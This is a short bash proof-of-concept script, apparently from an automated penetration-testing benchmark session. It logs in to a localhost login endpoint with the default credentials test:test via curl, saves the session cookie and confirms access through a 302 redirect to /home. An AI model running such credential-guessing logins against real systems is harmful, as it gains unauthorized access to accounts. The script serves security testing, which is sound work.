#!/bin/bash
# POC: Demonstrates exploitation of default credentials (test:test) in the login endpoint
# Target: ./repo
# Created: 2025-11-07T19:07:48.944Z
# Session: benchmark-XBEN-063-24-mhp81tzn

# Default Credentials Exploitation POC
# This script demonstrates the use of default credentials (test:test) to gain unauthorized access

TARGET_URL="http://localhost/login"
USERNAME="test"
PASSWORD="test"
REDIRECT_URL="http://localhost/home"

echo "[*] Default Credentials Exploitation POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing credentials: $USERNAME:$PASSWORD"
echo ""

# Send login request with default credentials
echo "[+] Sending login request..."
RESPONSE=$(curl -s -i -X POST "$TARGET_URL" \
  -d "username=$USERNAME&password=$PASSWORD" \
  -c /tmp/cookies.txt 2>&1)

echo "[+] Response received:"
echo "$RESPONSE"
echo ""

# Extract HTTP status code
HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
echo "[+] HTTP Status: $HTTP_STATUS"

# Check for redirect
if echo "$RESPONSE" | grep -q "HTTP/1.1 302\|HTTP/2 302"; then
  echo "[✓] VULNERABLE: Received 302 redirect (authentication successful)"
  
  # Extract session cookie
  SESSION_COOKIE=$(grep -i "Set-Cookie:" /tmp/cookies.txt | grep "session" | awk '{print $1}')
  if [ -n "$SESSION_COOKIE" ]; then
    echo "[✓] Session cookie obtained: $SESSION_COOKIE"
  fi
  
  # Extract Location header
  LOCATION=$(echo "$RESPONSE" | grep -i "^Location:" | awk '{print $2}' | tr -d '\r')
  echo "[+] Redirect Location: $LOCATION"
  
  if [[ "$LOCATION" == *"/home"* ]]; then
    echo "[✓] CONFIRMED: Redirect to /home indicates successful authentication"
    exit 0
  fi
else
  echo "[-] No redirect detected. Response may indicate failed authentication."
  exit 1
fi